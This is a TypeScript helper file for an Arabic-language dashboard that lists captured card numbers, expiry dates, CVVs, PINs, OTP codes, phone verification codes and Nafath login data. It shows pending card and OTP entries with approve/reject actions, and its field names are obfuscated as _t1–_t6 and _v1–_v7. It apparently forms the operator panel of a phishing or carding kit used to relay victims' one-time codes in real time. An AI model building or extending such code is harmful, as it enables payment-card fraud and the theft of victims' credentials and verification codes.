/**
 * Helper functions for working with history in the dashboard
 */
import { getCardTypeLabel } from "@/lib/card-utils"

export interface HistoryEntry {
  id: string
  type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad" | "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
  timestamp: string
  status: "pending" | "approved" | "rejected"
  data: any
}

export interface BubbleData {
  id: string
  title: string
  data: Record<string, any>
  timestamp: string
  status: "pending" | "approved" | "rejected"
  type: string
  showActions: boolean
  isLatest: boolean
}

/**
 * Get title for a history entry type
 */
export function getTitleByType(type: HistoryEntry["type"], index?: number): string {
  const titles: Record<string, string> = {
    card: "معلومات البطاقة",
    _t1: "معلومات البطاقة",
    otp: "كود OTP",
    _t2: "كود OTP",
    pin: "رمز PIN",
    _t3: "رمز PIN",
    phone_info: "معلومات الهاتف",
    _t4: "معلومات الهاتف",
    phone_otp: "كود تحقق الهاتف",
    _t5: "كود تحقق الهاتف",
    nafad: "نفاذ",
    _t6: "نفاذ"
  }
  
  const title = titles[type] || "بيانات"  // Default to "بيانات" instead of undefined
  return index !== undefined && index > 0 ? `${title} #${index + 1}` : title
}

/**
 * Get status label in Arabic
 */
export function getStatusLabel(status: string): string {
  switch (status) {
    case "approved": return "✓ تم القبول"
    case "rejected": return "✗ تم الرفض"
    case "pending": return "⏳ قيد المراجعة"
    default: return status
  }
}

/**
 * Format card data for display
 */
export function formatCardData(entry: HistoryEntry): Record<string, any> {
  const {
    cardNumber,
    _v1,
    cardType,
    cardLevel,
    level,
    expiryDate,
    _v3,
    cvv,
    _v2,
    bankInfo,
    bankName
  } = entry.data
  const normalizedType =
    cardType || entry.data?.scheme || entry.data?.type || getCardTypeLabel(cardNumber)
  const normalizedLevel = cardLevel || level || bankInfo?.level || entry.data?.binData?.level
  const normalizedBankName = bankInfo?.name || bankName || entry.data?.issuer?.name
  return {
    "رقم البطاقة": _v1 || cardNumber,
    "نوع البطاقة": normalizedType,
    "مستوى البطاقة": normalizedLevel,
    "تاريخ الانتهاء": _v3 || expiryDate,
    "CVV": _v2 || cvv,
    "البنك": normalizedBankName || "غير محدد",
    "بلد البنك": bankInfo?.country || "غير محدد",
    "طريقة الدفع": bankInfo?.paymentMethod || "credit-card"
  }
}

/**
 * Format OTP data for display
 */
export function formatOtpData(entry: HistoryEntry): Record<string, any> {
  const { otpCode, _v5 } = entry.data
  return {
    "الكود": _v5 || otpCode || "في انتظار الإدخال...",
    "الحالة": getStatusLabel(entry.status)
  }
}

/**
 * Format PIN data for display
 */
export function formatPinData(entry: HistoryEntry): Record<string, any> {
  const { pinCode, _v6 } = entry.data
  return {
    "الكود": _v6 || pinCode || "في انتظار الإدخال...",
    "الحالة": getStatusLabel(entry.status)
  }
}

/**
 * Format phone info data for display
 */
export function formatPhoneInfoData(entry: HistoryEntry): Record<string, any> {
  const { phoneNumber, phoneCarrier } = entry.data
  return {
    "رقم الجوال": phoneNumber,
    "شركة الاتصالات": phoneCarrier
  }
}

/**
 * Format phone OTP data for display
 */
export function formatPhoneOtpData(entry: HistoryEntry): Record<string, any> {
  const { phoneOtp, _v7 } = entry.data
  return {
    "كود التحقق": _v7 || phoneOtp || "في انتظار الإدخال...",
    "الحالة": getStatusLabel(entry.status)
  }
}

/**
 * Convert history entries to bubble data
 */
export function convertHistoryToBubbles(history: HistoryEntry[]): BubbleData[] {
  if (!history || !Array.isArray(history) || history.length === 0) {
    return []
  }

  // Group entries by type to add index numbers
  const typeGroups: Record<string, HistoryEntry[]> = {}
  history.forEach((entry) => {
    if (!typeGroups[entry.type]) {
      typeGroups[entry.type] = []
    }
    typeGroups[entry.type].push(entry)
  })

  // Convert to bubbles
  const bubbles: BubbleData[] = []
  
  history.forEach((entry, globalIndex) => {
    const typeEntries = typeGroups[entry.type]
    const typeIndex = typeEntries.indexOf(entry)
    const isLatest = globalIndex === 0
    
    let formattedData: Record<string, any> = {}
    
    switch (entry.type) {
      case "card":
      case "_t1":
        formattedData = formatCardData(entry)
        break
      case "otp":
      case "_t2":
        formattedData = formatOtpData(entry)
        break
      case "pin":
      case "_t3":
        formattedData = formatPinData(entry)
        break
      case "phone_info":
      case "_t4":
        formattedData = formatPhoneInfoData(entry)
        break
      case "phone_otp":
      case "_t5":
        formattedData = formatPhoneOtpData(entry)
        break
      default:
        formattedData = entry.data
    }
    
    bubbles.push({
      id: entry.id,
      title: getTitleByType(entry.type, typeEntries.length > 1 ? typeIndex : undefined),
      data: formattedData,
      timestamp: entry.timestamp,
      status: entry.status,
      type: entry.type,
      showActions: isLatest && entry.status === "pending" && (entry.type === "card" || entry.type === "otp" || entry.type === "phone_otp"),
      isLatest
    })
  })
  
  return bubbles
}

/**
 * Get entries by type
 */
export function getEntriesByType(history: HistoryEntry[], type: HistoryEntry["type"]): HistoryEntry[] {
  if (!history || !Array.isArray(history)) return []
  return history.filter((entry) => entry.type === type)
}

/**
 * Get latest entry of a specific type
 */
export function getLatestEntry(history: HistoryEntry[], type: HistoryEntry["type"]): HistoryEntry | null {
  const entries = getEntriesByType(history, type)
  return entries.length > 0 ? entries[0] : null
}
